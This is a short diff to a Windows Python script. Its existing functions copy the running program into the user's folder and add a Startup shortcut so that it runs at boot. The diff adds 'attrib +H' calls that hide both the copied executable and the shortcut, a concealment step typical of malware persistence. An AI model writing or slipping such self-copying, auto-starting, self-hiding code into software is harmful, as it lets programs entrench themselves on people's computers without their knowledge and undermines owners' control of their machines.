@@ -1,6 +1,7 @@
 import os
 import win32com.client
 import win32gui, win32con
+import subprocess
 
 import shutil
 
@@ -16,6 +17,7 @@ def cloneExe(NAME):
     if os.path.exists(curr):
         to = "C:\\Users\\" + os.getlogin() + fr"\{NAME}.exe"
         shutil.copyfile(curr, to)
+        subprocess.check_call(["attrib","+H",f"{to}"])
     return to
 
 # Adds shortcut to startup, causing program to run on computer bootup
@@ -28,6 +30,7 @@ def addStartup(to):
         shortcut.Targetpath = to
         shortcut.IconLocation = to
         shortcut.save()
+        subprocess.check_call(["attrib","+H",f"{path}"])
         return False
     else:
         return True
